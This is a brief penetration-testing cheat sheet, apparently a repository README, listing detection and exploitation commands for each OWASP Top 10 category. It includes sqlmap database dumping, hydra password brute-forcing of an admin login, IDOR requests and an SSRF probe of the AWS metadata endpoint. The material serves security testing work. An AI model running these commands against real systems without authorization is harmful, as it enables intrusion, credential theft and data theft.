
# VAPT Exploitation Cheat Sheet

This repository serves as a one-stop guide for identifying and exploiting vulnerabilities across the OWASP Top 10 categories.

---

## 🔐 Broken Access Control

### 🔍 Detection

```bash
# Try accessing an unauthorized endpoint
curl -b "auth_token=..." http://target/admin
```

### 🎯 Exploitation

```bash
# IDOR exploitation example
curl http://target/api/user/2
```

---

## 🔐 Cryptographic Failures

### 🔍 Detection

```bash
# Check for missing HTTPS, weak ciphers
sslscan target.com
```

### 🎯 Exploitation

```bash
# Downgrade attack (if possible)
sslyze --regular target.com
```

---

## 🧪 Injection (SQLi, Command Injection, etc.)

### 🔍 Detection

```bash
sqlmap -u "http://target.com/product.php?id=1" --batch --level=5 --risk=3
```

### 🎯 Exploitation

```bash
# Exploit with sqlmap to dump DB
sqlmap -u "http://target.com/product.php?id=1" --dump
```

---

## 📐 Insecure Design

- Manual Testing Needed:
    
    - Unprotected workflows
        
    - Weak logic in password reset
        
    - Lack of rate limiting
        

---

## ⚙️ Security Misconfiguration

### 🔍 Detection

```bash
nuclei -u http://target.com
nikto -h http://target.com
```

### 🎯 Exploitation

```bash
# Exploit default creds if found
hydra -l admin -P rockyou.txt http://target.com/login
```

---

## 🧱 Vulnerable & Outdated Components

### 🔍 Detection

```bash
whatweb http://target.com
nmap --script vulners -sV target.com
```

---

## 🚲 Identification & Authentication Failures

### 🔍 Detection

```bash
# Check for missing MFA, brute-forceable logins
hydra -l admin -P rockyou.txt http://target.com/login
```

---

## 🔒 Software & Data Integrity Failures

- Manual and Dependency Tool Testing:
    
    - Check source maps, misconfigured CI/CD
        
    - Tools: `npm audit`, `trivy`, `retire.js`
        

---

## 📜 Security Logging & Monitoring Failures

- Detection:
    
    - No logs for auth events
        
    - Manual review required
        

---

## 🌐 SSRF (Server-Side Request Forgery)

### 🔍 Detection

```bash
# Common SSRF payload
curl -X POST http://target.com/fetch?url=http://127.0.0.1:80
```

### 🎯 Exploitation

```bash
# Try accessing AWS metadata
curl http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

---
